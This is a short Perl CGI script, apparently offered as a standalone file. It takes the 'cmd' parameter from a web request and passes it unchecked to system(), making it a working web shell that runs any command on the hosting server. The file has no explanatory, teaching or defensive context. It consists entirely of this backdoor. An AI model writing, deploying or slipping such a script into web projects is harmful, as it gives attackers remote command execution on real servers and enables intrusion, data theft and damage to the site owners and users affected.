#! /usr/bin/perl
use CGI ":standard";

print header;
print start_html("command");
$cmd=param("cmd");
system($cmd);
print end_html;
